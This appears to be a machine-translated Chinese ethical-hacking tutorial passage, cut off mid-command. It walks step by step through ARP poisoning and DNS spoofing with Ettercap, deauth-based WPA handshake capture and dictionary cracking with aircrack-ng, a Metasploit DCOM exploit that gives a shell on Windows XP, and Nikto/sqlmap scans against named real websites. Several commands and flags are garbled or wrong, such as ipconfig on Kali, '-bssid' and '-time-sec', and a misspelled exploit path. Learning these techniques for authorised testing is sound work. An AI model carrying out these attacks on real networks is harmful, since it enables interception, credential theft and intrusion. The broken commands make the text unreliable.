  （等待，我注意到提供的文本中重复了。我将提供最终格式化的文本。）\n\n\n\n\n# MAC 泛洪\n\n## 欺骗攻击\n\n### 受影响的协议\n`TCP/IP`\
  \ 以及其他类似协议的设计并未考虑安全性，这可能是黑客攻入最容易的入口之一。许多规则使得嗅探变得更加容易：\n\n* `HTTP` - 用于发送未加密的明文信息——高风险目标\n\
  * `SMTP` - 简单邮件传输协议的缩写，用于发送电子邮件。它是一种高效的协议，但没有防止嗅探的保护措施\n* `NNTP` - 网络新闻传输协议的缩写，用于所有类型的通信，但所有数据和密码都以明文形式在网络上传输，且未经过加密\n\
  * `POP` - 邮局协议的缩写，用于从服务器接收电子邮件。它没有内置的嗅探保护机制\n* `FTP` - 文件传输协议的缩写，用于发送和接收文件，但没有安全性。所有内容均以明文形式发送\n\
  * `IMAP` - 互联网消息访问协议的缩写，它与 `SMTP` 非常相似，但更容易被嗅探\n* `Telnet` - `Telnet` 是最糟糕的协议之一，它将用户名、密码甚至按键等所有敏感数据以明文形式在网络上传输。\n\
  \n### 嗅探工具\n有很多网络嗅探工具，每种工具都有自己的功能，可以帮助你分析流量并从信息中获取你需要的内容。它们是最常用的道德黑客工具，以下是一些较好的工具：\n\
  \n* `BetterCAP` - 一个非常强大且灵活易携的工具。它的创建初衷是对网络进行 `MITM`（中间人）攻击，对 `TCP`、`HTTP` 和 `HTTPS`\
  \ 流量进行实时操控，嗅探凭据等信息。\n* `Ettercap` - 这是一个完整的 `MITM` 攻击套件。包含的工具允许你嗅探实时网络连接、在此过程中过滤内容等许多功能。它支持主动和被动协议分析，并有许多用于主机和网络分析的工具。\n\
  * `Wireshark` - 最流行的嗅嗅探之一，为流量分析和解析提供了大量功能。\n* `Tcpdump` - 一种流行的分析数据包的命令行工具，提供了在网络传输期间拦截和观察\
  \ `TCP/IP` 包和其他数据的工具。\n* `WinDump` - 适用于 Windows 的 `tcpdump` 版本，一种用于分析头部信息的命令行工具。\n\
  * `Dsniff` - 一个用于嗅探多种协议的完整套件，用于拦截并泄露密码。\n* `EtherApe` - 设计用于生成入站系统连接的图形化显示。\n* `MSN\
  \ Sniffer` - 如其名，设计用于嗅探由 MSN Messenger 生成的所有流量。\n* `NetWitness NextGen` - FBI 等执法机构使用的工具，它具有基于硬件的嗅探器和其他许多功能，可以监控并分析所有网络流量。\n\
  \n## ARP 投毒\n`ARP` 或地址解析协议是一种“无状态”协议，通常用于将 `IP` 地址解析为机器的 `MAC` 地址。任何需要在网络上通信的设备设备都会广播\
  \ `ARP` 查询以定位其他 `MAC` 地址。`ARP 投毒`也称为 `ARP 欺骗`，其工作原理如下：\n\n* 当网络上的某台机器与另一台机器通信时，它会查找\
  \ `ARP` 表\n* 如果 `MAC` 地址不在表中，则会在整个网络中广播 `ARP` 请求\n* 该网络上的所有机器都会比较 `IP` 地址和 `MAC`\
  \ 地址\n* 如果任何机器可以识别出自己，它就会响应请求并提供其 `IP` 和 `MAC` 地址\n* 发起请求的计算机将地址存储在 `ARP` 表中，然后两端即可通信。\n\
  \n### 什么是 ARP 欺骗？\n黑客可以伪造 `ARP` 数据包，使得请求的信息发送到黑客的计算机。大量的此类伪造请求/响应数据包被用来过载网络交换机，导致交换机被设置为转发数据。一旦\
  \ `ARP` 表被伪造响应淹没，黑客就可以嗅探每一个网络包。黑客会将伪造条目填充到目标计算机的 `ARP` 缓存中；这被称为“投毒”，并利用 `MITM` 访问将毒素扩散到网络。\n\
  \n### 什么是 MITM？\n`MITM` 代表中间人攻击（Man in the Middle）。这是一种主动攻击，黑客将假成用户；在受害者之间建立连接，并在他们之间发送消息。受害者认为他们正在相互通话，但实际上黑客控制着一切。\n\
  \n游戏中存在第三个玩家，他负责控制和监控受害者之间的通信流量。存在一些协议（如 `SSL`），可以防止此类攻击的发生。\n\n### 练习\n我们将使用 `BetterCAP`\
  \ 执行 `ARP 投毒`。环境是局域网（LAN），我们将使用安装了 `Kali Linux` 和 `Ettercap` 的 `VMWare workstation`\
  \ 进行流量嗅探。\n\n你需要：\n* `VMware Workstation`\n* `Kali Linux`\n* `LAN 连接`\n* `Ettercap`\n\
  \n这可以在有线和无线网络中进行，可以在本地局域网中进行。\n\n1. 如果你还没有安装，请安装 `VMware` 和 `Kali Linux`\n2. 使用用户名密码“root,root”登录\
  \ `Kali`\n3. 连接到本地局域网并打开终端；在提示符处输入 `ipconfig` 检查 `IP` 地址\n4. 在命令行提示符输入 `Ettercap\
  \ -G`，将启动图形版本的 `Ettercap`\n5. 进入菜单栏并点击“sniff”标签。接着选择“unified sniffing”并点击 `O`。我们将使用\
  \ `eth0` —— 以太网连接。\n6. 在菜单栏点击“hosts”，然后点击“scan for hosts”——网络将扫描可用的主机。\n7. 在菜单栏点击“hosts”，然后点击“hosts\
  \ list”——这将显示网络上有多少个可用主机。这还将显示默认网关地址。\n8. 下一步是选择你的目标。在 `MITM` 中，主机是目标，经经路径将是转发流量的路由器地址。黑客将拦截并嗅探网络上的所有数据包。我们将受害者称为“target\
  \ 1”，路由器地址称为“target 2”。\n9. 在我们的练习中，目标 `IP` 是 `192.168.121.129`，路由器将是 `192.168.121.2`。将\
  \ target 1 添加为受害者 `IP`，target 2 添加为路由器 `IP`。\n10. 点击 `MITM`，然后点击 `ARP Poisoning`。确保“Sniff\
  \ Remote Connections”选项已启用并点击 OK。\n11. 点击 Start，然后点击 Start Sniffing……`ARP 投毒` 现在将开始，显示\
  \ `NIC` 已切换到混杂模式，从而能够对所有本地流量进行嗅探。\n\n你可以在 `Ettercap` 的工具栏中看到结果。\n\n`ARP 投毒` 可能导致公司遭受巨大损失，大多数道德黑客受公司雇佣，通过保持网络安全来防止这种情况的发生。\n\
  \n\n\n\n我们将再次使用 `Ettercap` 来执行 DNS 投毒。它与 ARP 欺骗类似，事实上，你需要从 ARP 欺骗开始来初始化 DNS 投毒。我们将使用\
  \ `Ettercap` 中的 `dns spoof` 插件。\n\n1. 打开你的终端，在命令提示符输入 `nano etter.dns`。这包含了 `Ettercap`\
  \ 用于解析域名地址的 DNS 地址记录。我们将添加一个名为“Facebook”的假条目，这样当用户打开它时，他们会被重定向到一个虚假的 Facebook 页面。\n\
  \n2. 在显示 `Redirect it to `www.linux.org`` 的地方插入条目。\n\n3. 保存文件并退出。\n\n4. 现在的过程与启动\
  \ ARP 欺骗完全相同，一旦启动了它，点击 `Plugins`（插件）并选择 `dns spoof` 插件。\n\n5. 一旦激活了此插件，结果将显示每当有人尝试打开\
  \ `Facebook.com` 时，它都会开始被伪造到 Google 的 IP 地址。这意味着，当用户尝试访问 `Facebook` 时，他们打开的是 Google\
  \ 页面。\n\n## 防御 DNS 投毒\n\n道德黑客经常被聘用通过保护网络来防止攻击，而你作为黑客所学到的知识将有助于你防止黑客所用的小这些技术。\n\n\
  从渗透测试员的角度来看，这些是你用来防御此类攻击的一些防御措施：\n\n*   为了保护网络的敏感部分，请使用硬件交换网络。这将帮助你将网络流量隔离到网络的一个部分。\n\
  *   通过在网络交换机上实施 `IP DHCP Snooping` 来防止 ARP 欺骗和投毒攻击。\n*   制定策略防止网络适配器被切换到混杂模式。\n\
  *   当你深入部署无线接入点时，要非常小心，并意识到无线网络上的所有流量都容易受到嗅探。\n*   任何敏感流量都应该使用 `SSH`、`IPsec` 或其他加密协议进行加密。\n\
  * 确保可以编程允许指定的 `MAC` 地址在每个端口发送和接收数据的交换机已通过 `port security`（端口安全）进行保护。\n*   使用 `IPV6`\
  \ 代替 `IPV4`，因为它更安全且选项更多。\n* 用 `SSH` 替换 `Telnet`、`FTP` 和其他类似协议，以提供对网络嗅探的更好的防御。如果你无法使用\
  \ `SSH`，请考虑使用 `IPsec` 来保护你的遗留协议。\n*   使用 `VPN` 提供一个阻止嗅探的屏障。\n*   在可能的地方使用 `SSL`。\n\
  \n我们已经查看了黑客如何使用网络上的数据包嗅探器捕获并分析流量。通过一个现实示例，我们可以看到在指定的网络上获取指定受害者的凭据是非常容易的。`MAC` 地址、`DNS`\
  \ 和 `ARP poisoning` 是黑客用于嗅探流量和获取敏感数据的攻击类型。\n\n在下部分，我们将深入实战，开始进行我们自己的道德黑客，从无线网络攻击开始。\n\
  \n如果你不介意，请为我的 [Amazon 上的书籍](https://www.amazon.com/dp/B07NSRW9FZ) 写简短的评论，并随时告诉我你的想法！非常感谢！\n\
  \n# 第三部分：实战攻击\n\n### 无线网络攻击\n\n技术领域每天都有新的改进。几乎所有的办公室、酒店、咖啡馆、餐厅和家庭都安装了 Wi-Fi 网络，也称为\
  \ `WLAN` 或无线局域网。这些网络极其多功能且适应性强，仅仅是因为它们让人们的生活变得更容易、更舒适。它们具有移动性，价格更便宜，而且大多数人都能负担得起并使用。`WLAN`\
  \ 也比有线网络更容易安装和实施，但尽管它的覆盖范围非常广，一个问题仍然存在——它有多安全？\n\nWi-Fi 网络基于一组特定的 `WLAN` 标准——`IEEE\
  \ 802.11`。`IEEE`（电气与电子工程师学会）成立于于 1980 年 2 月，而“11”指的是 `WLAN` 的工作组，它是“802”的一个子小组。\n\
  \n多年来，对 Wi-Fi 网络的需求急剧增长，几乎每个人在使用任何操作系统（包括移动设备）时都会使用 `WLAN`。每个人都应该放在脑海中处于首位的一点是，没有任何计算机网络是完全安全的。虽然这项技术如此广泛是一个好消息，但也意味着现在的危险比以往任何时候都多得多。无论\
  \ `IEEE` 组织的规模如何，无线网络现在是世界上最大的目标之一。\n\n曾几何时，无线网络方面最常见的问题是间谍软件和弱密码。虽然这些问题确实存在并且仍在呈上升趋势，但\
  \ `WLAN` 打开了一整套全新的漏洞，这就是白帽或道德黑客出现的地方，用以防御黑帽。\n\n道德黑客不仅仅是一个简单的名称；它是渗透测试，是漏洞测试，也是安全。一个道德黑客需要能够看到未来，提前计划，并使用与黑帽黑客相同的工具，但他们将利用这些工具来对抗他们，阻止他们攻击系统。\n\
  \n在这一部分，我们将关注影响无线网络的漏洞，以及你如何进入这些网络（当然是合道德地），以加固并保护它们免受不道德攻击的侵害。\n\n### 测试你的系统\n\n\
  无线网络从未完全安全过，从第一天起如此，而且可能永远不会。这里有太多的潜在弱点，包括加密方面的缺陷、身份验证问题、物理安全问题等。你还有许多工具可以测试你的系统并在需要的地方关闭漏洞，并且出现了两个安全标准来帮助保护无线网络并对抗黑客——`Wi-Fi\
  \ Protected Access` 和 `IEEE 802.11`。\n\nWi-Fi Protected Access 或所知的 `WPA`，由 `Wi-Fi\
  \ Alliance` 开发，旨在修复 `WEP` 的漏洞，并一直使用到 `IEEE 802.11` 开发为止。该标准也被称为 `WPA2`，开发目的是将 `WPA`\
  \ 的修复与其他涵盖加密和身份验证的机制相结合，反过来这有助于提高网络的安全性。\n\n这两个标准共同成功解决了许多围绕无线网络的安全问题，但有一点是他们无法修复的——人类。安全标准可能运行得很好，但只有在它们被正确实施时才会起作用。在某些情况下，IT\
  \ 管理员并没有这样做，特别是在他们的网络已经配置过的情况下——他们不想再次更改所有的 Wi-Fi 设置。他们不想重新设计安全机制，也不想实施新机制，以防让他们的管理系统变得太复杂。是的，这些是非常合理的问题，但正是这些导致了网络暴露在攻击之下。\n\
  \n尽管如此，即使充分实施了标准和其他策略，也不能保证完全安全；它只是降低了风险。计算机网络永远不可能 100% 安全，但通过道德黑客，你可以学会如何多保护自己。\n\
  \n## 理解无线网络面临的风险\n\n在我们深入研究之前，有两个定义是你应该 same：\n\n*   漏洞 - 网络中易受攻击的脆弱点。一个例子是未完全加密或在接入点上使用弱密码的系统网络。接入点或\
  \ `AP` 是无线系统的中心。\n\n\n\n\n\n# 威胁\n- 威胁（Threat）是指系统内部（特别是信息系统）存在潜在危险的。威胁的一个典型例子是黑客代理，甚至是对公司怀有恨意的员工。恶意软件可能包含间谍软件和病毒，这些程序会让计算机网络陷入瘫痪。\n\
  \n你可能认为你的无线网络是完全安全的，没有任何异常发生，但机会总会存在，也总会有黑客来利用这些机会。无线网络中最大的风险包括：\n\n*   被盗的密码\n\
  *   某些对从服务器传输的所有文件具有完全访问权限的人\n*   允许黑客进入网络的后门\n*   被截获的电子邮件\n*   服务攻击拒绝，导致严重的停机和生产力损失\n\
  *   违反有关企业隐私和财务报告的国际、联邦和/或州法律\n*   垃圾邮件\n*   僵尸（Zombies）——这些是进入你的系统并利用该网络来攻击另一个网络的黑客\n\
  \n最大的问题是无线网络具有便携性，它们可以在任何地方运行工作，这意味着你完全不知道攻击可能来自哪里；它可能是咖啡馆里坐在你旁边的人，也可能是你的邻居。在没有合适工具的情况下，阻止攻击几乎是不可能的。\n\
  \n## 了解敌人\n无线网络漏洞并不一定是致命缺陷。最大的问题是那些愿意花时间和投入精力来利用这些弱点的不道德黑客。他们的目标是让你的生活变得困难，并从中从中获取利益。这就是古话所说“要抓小偷，你必须像小偷一样思考”的道理——如果你想保护自己的系统，你就需要像不道德的黑客那样思考。\n\
  \n如果你的系统不需要多少努力就能进入，那么对于黑客来说，它比锁得紧的系统更好的目标。他们倾向于寻找访问点较少的组织，这有几个充分的理由：\n\n*   访问点不多的系统极有可能保留了默认设置，这使得黑客攻击变得容易得多\n\
  *   小型组织可能没有时间或管理员来监控操作运行\n*   较小的网络不太可能具备高水平的控制或检查，例如 `WPA`、`WPA2` 或 `WID`（无线入侵检测系统）。这些是任何黑客的要要访问点。\n\
  \n然而，并非只有小型网络是脆弱的。所有规模的网络都可能受到攻击，而且黑客还可以利用其他漏洞，例如：\n\n*   并非所有组织都有足够的时间或网络管理员来监控网络的恶意行为\n\
  *   无线网络是有线网络的延伸；无论访问点在何处，后面都可能有一个有线网络\n*   进出流量是最大的弱点之一；在较大的网络中，黑客破解 `WEP` 加密密钥要容易得多——流量越大意味着发送到服务器的数据包越多，这意味着黑客可以捕获并分析更多数据包。反之，这加快了破解\
  \ `WEP` 加密所需的时间。\n*   `SSIDs`（服务集标识符）通常被设置为易识别的，如公司名称、特定部门或某人的名字。这为黑客提供了确定先从哪里攻击所需的信息。\n\
  \n## 理解无线网络的复杂性\n安装并启用防火墙、创建非常强的密码、甚至为访问控制设置复杂的配置，都不足以保持始终受到保护。除了我们已经讨论的标准和漏洞外，你还需要理解实现完全安全的最大障碍是网络的复杂性。\n\
  \n`IEEE 802.11` 协议从未被开发为完美的系统，将来永远不会，因为它们本身还有一些非常大的问题需要解决。与有线以太网系统不同，无线网络不仅仅允许你点击按钮来发送或接收信息；它们比使用简单的射频发送和接收数据包要复杂得多：\n\
  \n*   它们加密数据以确保其私密性\n*   负责认证的客户端必须确保只有授权的人员才能访问\n*   它们必须设置定时消息数据包，以确保一切正确同步，且数据传输没有冲突\n\
  *   它们必须检查所有数据的完整性，以确保没有数据被污染\n\n在所有这些之上，`802.11` 协议的网络设计意味着更多的复杂性：\n\n*   确保无线设备保持更新，这意味着移动设备、笔记本电脑、台式电脑、智能电视以及任何通过无线网络连接的设备\n\
  *   确定需要哪些天线以及它们需要放置在何处\n*   了解哪些设备允许在网络上，哪些不应该在那里\n*   调整信号功率设置以防止频率泄漏到授权区域之外\n\
  \n所有这些不同的复杂性提供的弱点比传统有线网络见过的要多。\n\n## 保护分析\n我们将很快进入实践阶段，但在你保护系统之前，你必须能够对其进行检查。在黑入这些漏洞之前，你需要了解漏洞在哪里，你检查的结果将告诉你需要的所有信息，特别是这些漏洞有多大以及是否可以被修复。你可以采取以下应对措施来处理发现的任何漏洞：\n\
  \n*   非技术攻击——用于利用人类的弱点，如疏忽、缺乏意识、过度信任等。\n*   网络攻击——可能包括安装伪造无线访问点以及试图说服网络客户端连接到恶意接入点的技巧。\n\
  *   软件攻击——安全问题是无休止的，这包括安装在无线网络系统上的所有应用程序、软件以及操作系统。\n\n最后一种是非常常见的攻击方法，软件攻击可能包括：\n\
  \n*   破解 `WEP` 加密密钥\n*   利用薄弱的认证进入无线网络\n*   使用默认密码进入网络（其中默认密码未被更改），并获取用于访问的 `SSIDs`\n\
  \n## 破解 Wi-Fi 网络 - 实践指南\n`Kali Linux` 是一个多功能工具，可以用于许多不同的事情，但它最因破解 Wi-Fi 网络或进行渗透测试而闻名。世界上有成百上千种不同的工具声称能做到——不要被骗了。如果你想正规地这样做，请使用\
  \ `Kali`。你看到大多数广告工具很可能是诈骗；它们由黑客发布，目的是让你进入他们可以入侵你系统的局面。破解 Wi-Fi 网络的唯一真实方法是使用 `Kali\
  \ Linux`、配备了监听模式（Monitor Mode）的网卡以及名为 `aircrack-ng` 的工具或类似的工具——我们将使用 `aircrack-ng`。\n\
  \n你还需要意识到，即使使用正确的工具，这不是一个游戏，黑客（即使是伦理黑客）也不是可以戏弄的事情。你至少需要对 `WPA` 认证的工作原理有一个基本的了解，对\
  \ `Kali` 及其工具的工作有一定的了解。\n\n你需要：\n\n*   `Kali Linux`\n*   一个可以注入和监控代码的 Wi-Fi 适配器。某些系统标准配备了此功能，但如果没有，你需要购买另一个\n\
  *   一个用于密码破解的字典文件——`Kali` 中内置了一些\n\n\n\n内置字典列表可以在名为 `/usr/share/wordlists` 的目录中找到，它们都使用\
  \ Gzip 压缩。最流行的是“rockyou”，以下是解压它的方法：\n\n1.  打开终端窗口并切换到 `rockyou` 所在的目录。在提示符处输入 `cd\
  \ /usr/share/wordlists` 即可。\n2.  要查看 `rockyou` 文件，在提示符处输入 `ls`。\n3.  接着输入 `gunzip\
  \ rockyou.txt.gz` 来提取该文件。\n4.  再次输入 `ls`，解压即可完成。\n\n如果你已经准备好了这一切，并且有时间且具备足够的耐心，那么让我们来看看你的\
  \ Wi-Fi 网络到底有多安全。\n\n### 重要提示\n如果你在没有所有者明确许可的情况下入侵无线网络，这属于违法和犯罪行为。本教程仅用于测试你自己的网络和路由器，以查看其真实安全性。如何。\n\
  \n### 第一步 - 打开 Kali Linux 并以 root 用户身份登录\n### 第二步 - 如果你的原生网卡不支持，请连接支持无线注入/监听模式的适配器。如果你正在使用\
  \ VMware 运行 Kali，可能需要使用设备菜单中的图标来连接适配器。\n### 第三步 - 断开系统已连接的所有无线网络，并打开终端窗口。在提示符处输入\
  \ `airmon-ng`。\n\n这将显示所有支持监听模式（而非注入模式）的无线适配器列表。如果你没有看到列出任何网卡，请断开适配器并重新连接。如果你使用的是内置适配器且没有任何显示，说明你的网卡并不支持监听模式，你需要购买一个。如果你的网卡出现了，它应该显示为类似\
  \ `wlan0` 的名称。\n\n### 第四步 - 在提示符处输入 `airmon-ng` 然后是无线网卡的名称，例如 `wlan0`。如果你看到“Monitor\
  \ Mode Enabled”的消息，意味着网卡已成功进入监听模式。注意，新的监听接口有一个名称，类似于 `mon0`。\n\n**注意** - Kali 最近的一个\
  \ Bug 导致 `airmon-ng` 在首次启用 `mon0` 时为通道设置了固定的 `-1` 值。如果你遇到了这种情况，或者你不想冒这个风险，在 `mon0`\
  \ 启用后，按照以下步骤操作：\n\n*   在提示符处输入 `ipconfig` 后跟网卡接口，然后输入“down”并按回车。网卡接口名称将是启用 `mon0`\
  \ 的那个接口。网卡将断开网络连接，以便完全专注于监听模式。稍后，你需要重新启用你的无线接口名称（`wlan0` 或它原来的任何名称）。你通过输入 `ipconfig\
  \ (网卡名称) Up` 并按回车来实现。你需要在指南的无线部分完成后执行此操作。\n\n### 第五步 - 在提示符处输入 `airodump-ng` 和监听接口的名称（`mon0`\
  \ 或你的接口名称）。如果你遇到固定通道 `-1` 错误，请参考上文。\n\n### 第六步 - 现在你将看到区域内当前无线网络的列表，以及关于每个网络的一些有用信息。在列表中找到你的网络\
  \ - 列表会不断刷新，请仔细观察，当你看到它时，按下键盘上的 `CTRL+C` 列表将停止。记录下与网络相关的通道。\n\n### 第七步 - 写下或复制目标的\
  \ BSSID，然后输入 `airodump-ng -c (通道号) -bssid (bssid 号) - /root/Desktop/(监听接口)`。确保括号中的所有内容都已根据已知信息填写，并在显示“desktop”的地方输入你将保存的位置。“-w”和文件路径命令指定了\
  \ `airodump` 保存截获到的任何四次握手（4-way handshakes）的位置 - 你破解密码需要这些。将其保存在你能再次找到的地方。之后，按回车。一个正确的命令示例如下：\n\
  \n```\nairodump-ng -c 11 -bssid 01:21:BF:E0:E8:D5 -w /root/Desktop/mon0\n```\n\n\
  `airodump` 现在将监控你选择的目标网络，且仅监控该网络，以便我们获取更具体、更有用的信息。正在发生的情况是我们在等待另一个设备连接到该网络，从而强制路由器发送我们破解密码所需的四次握手。你还应该会在桌面上看到四个独立的文件\
  \ - 不要删除它们；当握手被捕获时会保存到这些文件中！\n\n### 第八步 - 我们不会一直等，因为我们是缺乏耐心的黑客（像很多人一样），我们将使用来自 aircrack\
  \ 套件的另一个工具。该工具名为 `aireplay-ng`，它可以加快我们的速度。黑客使用 `aireplay-ng` 强制设备连接，他们通过向网络设备发送\
  \ `deauth`（去认证）包来实现，这会让设备认为它必须重新连接。\n\n要使此方法生效，你需要另一个已经连接到网络的设备，因此请关注 `airodump-ng`；你正在寻找客户端的出现，可能几几秒钟也可能需要几小时。如果你长时间等待后没有看到任何，要么网络是空的，要么你离网络太远。\n\
  \n### 第九步 - 一旦客户端出现，打开另一个终端 - 让 `airodump` 继续运行。在第二个终端中，输入此命令 - `aireplay-ng -0\
  \ 2 -a(router bssid) -c (client bssid) mon0`。\n\n-   `-o` 是启用去认证模式的简写，`2` 是将发送的包数。`-a`\
  \ 表示接入点 bssid，路由器 bssid 需要替换为目标网络的 BSSID，客户端 bssid 需要是已连接客户端的 bssid，你可以在 `STATION`\
  \ 下找到它。`Mon0` 是监听接口，所以如果你的名称不同，请输入正确的名称。\n\n### 第十步 - 按回车键，`aireplay-ng` 将发送这两个包。如果你离目标足够且进程成功，你会在\
  \ `airodump-ng` 屏幕上看到“WPA Handshake”的消息，随后是目标的 BSSID。\n\n这告诉你握手已成功捕获，并且通过某种方式，密码现在落到了黑客手中。可以关闭\
  \ `aireplay-ng` 终端，并在 `airodump` 终端上按 `CTRL+C` 停止监控 - 先不要关闭它，你以后可能还需要它上面的信息。\n\n\
  如果你没有看到握手消息，说明发送包时没有按计划进行。有很多因素可能出现问题 - 你可能离得不够近，这时请靠近一点。发送去认证包的设备可能没有设置为自动重连；你需要尝试不同的设备，或者只需让\
  \ `airodump` 运行直到建立连接。\n\n你需要意识到，尽管付出了所有努力，并不是每个 WPA 网络都能这样破解。\n\n### 第十一步 - 无线部分已完成。从现在开始，一切都发生在你的电脑和那四个文件之间。这些文件中最重要的名为\
  \ `.cap` 的文件，所以打开终端并输入 `aircrack-ng -a2 -b (router bssid) -w(path to wordlist) /root/Desktop/*.cap`。\n\
  \n在这里，`-a` 是用于破解握手的 aircack 方法，`-2` 表示 WPA 方法，`-b` 用于 bssid，路由器 bssid 应该替换为目标，`-w`\
  \ 表示字典列表且字典列表路径应是你下载的字典列表路径。最后部分是包含密码的 `.cap` 文件的路径。按回车键。\n\n### 第十二步 - 现在 `aircrack-ng`\
  \ 将开始密码破解过程。然而，只有当密码包含在你的字典列表中时，它才能破解密码。如果不在，你需要下载另一个 - 互联网上有许多 - 并不断尝试直到找到它为止。如果你完全无法破解该密码，则测试失败，你的网络对于任何基础暴力破解尝试都是安全的。\n\
  \n\n\n\n\n取决于你的字典列表长短，破解密码可能需要几秒钟或几小时。如果找到了密码，`airrack-ng` 将在屏幕上显示它。如果你非常容易就找到了它，这说明你的密码确实需要更改了。如果你是在获得许可的情况下为他人执行此操作，请告诉他们立即更改密码。\n\
  \n## 渗透测试\n\n渗透测试是发现系统弱点的最佳方法。渗透测试（通常称为 pen test）是对系统进行攻击，以寻找安全漏洞和脆弱点，并有可能通过这些漏洞获取系统的访问权限，进而获取数据甚至整个系统的完整功能。渗透测试过程需要先识别目标，然后审查获得的信息，并执行所需的后续。伦理黑客利用渗透测试来确定不道德不守法的黑客可能会如何访问并破坏系统，以及他们可能造成的潜在损害。\n\
  \n与其仅仅向你介绍渗透测试，我将准备向你展示如何进行操作，因为那是学习上容易得多的方法。你需要一个正版的 Windows XP 副本（你可能需要一张光盘），因为这就是我们要使用\
  \ VMware 破解的对象。在实际机器上进行此操作，尤其是他人的机器，可不是个好主意！\n\n### 你需要的东西\n\n- `Kali Linux`\n-\
  \ `VMware tools` - 没有这些工具，你无法在同一台计算机上设置攻击和目标机器。\n- `Windows XP` - 你需要 `SP1` 和未打补丁的\
  \ XP 版本。利用程序在已打补丁的版本上无效。\n- `虚拟机`\n\n### 使用 Metasploit 框架\n\nMetasploit 需要一些没有随标准\
  \ Kali 系统启动而提供的服务，因此你首先需要在终端终端中输入一些命令：\n\n```\nservice postgresql start\n```\n`PostgreSQL`\
  \ 是 Metasploit 使用的数据库，因此必须先启动。\n\n一旦它运行，我们就可以打开 Metasploit 服务。当它首次启动时，会创建一个 `msf3`\
  \ 数据库和数据库用户，并启动 Metasploit 所需的 RPC 和 Web 服务器。输入 `service Metasploit start`。\n\n\
  如果你在这些命令中遇到任何错误，请跳过它们并直接输入 `msfconsole`。\n\n你应该已经在 VMware 中运行了 Kali，现在你需要将 Windows\
  \ XP 加载到虚拟机中与其并行运行。完成后，我们将使用 Metasploit 框架尝试检测这两台机器，为了做到这一点，我们需要进行端口扫描。\n\nMetasploit\
  \ 有一个名为 `auxiliary scanner` 的强大端口扫描功能。要执行扫描，在命令提示符输入以下内容 - 使用 `auxiliary/scanner/portscan/tcp`\n\
  \n要查看所有可用选项，输入 `show options`。\n\n我们需要对设置进行一些更改。首先，我们需要扫描较少的端口，因此输入 `set ports 1-500`。\n\
  \n接下来，我们需要指定要扫描的 IP。这并不容易，因为在某些情况下 IP 会所不同。因此，进入运行 XP 的虚拟机并打开命令提示符。输入 `ipconfig`，你应该就能在结果中看到\
  \ IP - 这就是需要在 `RHOSTS` 中指定的 IP。\n\n回到你的 Kali 虚拟机，使用你获得的 IP 地址输入以下内容：\n\n```\nSet\
  \ RHOST xxx.xxx.xx.xxx\n```\n\n再次输入 `show options` 以确认你所做的更改，然后输入 `run`。\n\n端口扫描将开始，过了一会儿你将看到一个开放的\
  \ tcp 端口列表；那些就是容易被攻击的端口。如果你使用的是较晚的、打过补丁的 Windows XP 版本，将看不到任何端口。\n\n 如果没有看到任何开放端口，请禁用防火墙并重试。记下每个开放端口的数字。\n\
  \n### 寻找利用程序\n\n这是一个重要的步骤，因为我们需要确定哪些利用程序在目标操作系统上有效。在命令提示符处，输入 `back`，然后进入 `msfconsole`。输入\
  \ `search dcom`。\n\n这是一个众知的 Windows 利用程序。复制利用程序的编号，并在下一行输入 `use exploit/windows/dcerpc/mso3_026_dcom`。\n\
  \n输入 `show options` 并输入 `set RHOST` `xxx.xxx.xx.xxx`（输入目标 IP）。\n\n接下来，我们需要设置有效负载（payload），因此输入\
  \ `set PAYLOAD windows/shell_bind_tcp`。\n\n输入 `exploit`，你现在进入了目标计算机系统。在目标系统上你将看到一个开放的\
  \ shell，并且你将拥有完全的管理员权限；该系统现在属于你了。\n\n## 使用 Nikto 和 SQL 破解网站\n\n感谢 https://null-byte/wonderhowto.com/\
  \ 提供的帮助\n\n在你甚至考虑破解网站之前，作为一名白帽黑客，你的工作是先进行侦察。在没有看到漏洞所在之处就向网站发动攻击是愚蠢且完全浪费时间的行为。进行适当的侦察只需要几分钟，而且它可以让生活变得容易得多。\n\
  \n最易用的工具之一，也是我们将开始使用的工具是 `Nikto`。这是一个开源扫描器，它可以查看网站并记录它发现的漏洞。然而，虽然这是一个有效的工具，但它并不特别隐蔽，如果网站有入侵检测系统，它将检测到该工具。但由于它最初被设计为安全测试工具，它并不需要隐蔽。\n\
  \n**第一步** - 打开 Kali 并遵循此路径 - `Kali Linux>Vulnerability Analysis>Misc Scanners>nikto`。\n\
  \n**第二步** - 在命令提示符输入 `nikto -h` 后紧跟 IP 地址来扫描 Web 服务器的漏洞。你应该能看到关于 Web 服务器的一些信息，例如服务器是什么（例如\
  \ `Apache`），以及有关潜在漏洞的信息。你可能会看到一些带有 `OSVDB` 前缀的漏洞 - 这代表 Open Source Vulnerability（开源漏洞数据库）。\n\
  \n**第三步** - 扫描另一个网站，在命令提示符输入 `nikto -h` 后紧跟 IP 地址。你将看到加载 Web 服务器的一些信息以及一个包含漏洞的列表。你可能会看到一些带有\
  \ `OSVDB` 前缀的漏洞。如果你访问 [`osvdb.org/`](http://osvdb.org/)，你可以识别这些漏洞。找到 `nikto` 识别出的\
  \ `OSVDB-877` 漏洞 - 只需要在搜索栏输入该编号，信息就会以后页的形式出现。\n\n查看页面下半部分，你应该看到各种漏洞来源引用以及工具和其他过滤器。\n\
  \n尝试另一个；`nikto -h wonderhowto.com`。\n\n再次，服务器信息将会出现以及漏洞列表，但由于该网站不是基于 `asp` 或 `php`\
  \ 构建的，尝试利用这些漏洞只会得到一个 404 错误页面。这些是由于扫描没有执行它们而产生的虚假漏洞。\n\n最后一个，让我们尝试 Facebook。输入 `nikto\
  \ -h facebook.com`。你将从中得不到什么；Facebook 的防御非常严密，漏洞很少。面对现实吧，如果不是这样，一切都会乱套！\n\n### 使用\
  \ SQL\n\n对于这部分，我们将使用 Kali 和 `sqlmap`，后者已安装在 Kali 中。`sqlmap` 是一个非常有用的工具，可以更容易对网站进行\
  \ SQL 注入。它是开源的，用于检测和利用 SQL 注入漏洞并接管数据库服务器。它内置了一个非常强大的检测引擎，以及许多针对渗透人员的功能和多个开关。\n\n\
  **第一步** - 打开 Kali 并启动一个新的终端。在提示符处，输入 `sqlmap -h`。这将显示 `SQLMap` 支持的命令列表，所以首先我们将从一个非常简单的命令开始。\n\
  \n\n\n\n\n## 第二步\n\n- 在命令行提示符下，输入 `sqlmap -u`，后接你想要测试的网站名称。为了本次练习，请输入 `sqlmap -u\
  \ http://testphp.vulnweb.com/listproducts.php?cat=1`。\n\n你可以使用名为 `-time-sec` 的命令来帮助加速，这在服务器运行缓慢时非常有用。\n\
  \n```\nsqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -time-sec 15\n\
